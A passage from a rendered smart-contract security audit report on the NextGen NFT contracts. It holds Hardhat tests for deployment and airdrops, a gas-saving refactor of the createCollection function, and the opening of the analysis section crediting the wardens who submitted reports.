</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">loadFixture</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD deploy contracts&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD create a collection and setup collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addMinterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRandomizer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD revert when attempting to airdrop when collection is NOT added&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">airDropTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk8\">&quot;data&quot;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;No supply&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD successfully airdrop tokens when collection data is added&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">50</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">500</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">100</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">airDropTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk8\">&quot;data&quot;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h2 id=\"g-06-optimize-creation-of-collection\" style=\"position:relative;\"><a href=\"#g-06-optimize-creation-of-collection\" aria-label=\"g 06 optimize creation of collection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Optimize creation of collection</h2>\n<p><strong>976 gas can be saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenCore:createCollection()</code></td>\n<td>252555</td>\n<td>251579</td>\n<td>976</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"recommendation-23\" style=\"position:relative;\"><a href=\"#recommendation-23\" aria-label=\"recommendation 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Refactoring the creation of a collection, a critical entry point, into simpler code can save gas:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function createCollection(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionName = _collectionName;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        isCollectionCreated[newCollectionIndex] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        newCollectionIndex = newCollectionIndex + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       isCollectionCreated[newCollectionIndex] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       collectionInfo[newCollectionIndex++] = collectionInfoStructure(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionName,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionArtist,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionDescription,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionWebsite,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionLicense,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionBaseURI,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionLibrary,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _collectionScript</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L130-L141\">Source: smart-contracts/NextGenCore.sol#L130-L141</a></p>\n<h3 id=\"poc-10\" style=\"position:relative;\"><a href=\"#poc-10\" aria-label=\"poc 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p>This can be verified using existing test suite.</p>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/191\">here</a>.</em></p>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 19 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2005\">report highlighted below</a> by <strong>MrPotatoMagic</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1888\">dimulski</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1841\">K42</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1563\">dy</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1472\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/926\">JohnnyTime</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/772\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2026\">Kose</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1989\">Fulum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1962\">clara</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1951\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1823\">SAAJ</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1690\">ihtishamsudo</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1526\">cats</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1442\">3th</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/844\">niki</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/487\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/347\">peanuts</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/114\">digitizeworx</a>.</em></p>\n<h1 id=\"analysis-report\" style=\"position:relative;\"><a href=\"#analysis-report\" aria-label=\"analysis report permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Analysis Report</h1>\n<h2 id=\"preface\" style=\"position:relative;\"><a href=\"#preface\" aria-label=\"preface permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Preface</h2>\n<p>This audit report should be approached with the following points in mind:</p>\n<ul>\n<li>The report does not include repetitive documentation that the team is already aware of. It does include suggestions to provide more clarity on certain aspects in the documentation.</li>\n<li>The report is crafted towards providing the sponsors with value such as unknown edge case scenarios, faulty developer assumptions and unnoticed architecture-level weak spots.</li>\n<li>If there exists repetitive documentation (mainly in <a href=\"#mechanism-review\">Mechanism Review</a>), it is to provide the judge with more context on a specific high-level or in-depth scenario for ease of understandability.</li>\n</ul>\n<h2 id=\"approach-taken-in-evaluating-the-codebase\" style=\"position:relative;\"><a href=\"#approach-taken-in-evaluating-the-codebase\" aria-label=\"approach taken in evaluating the codebase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 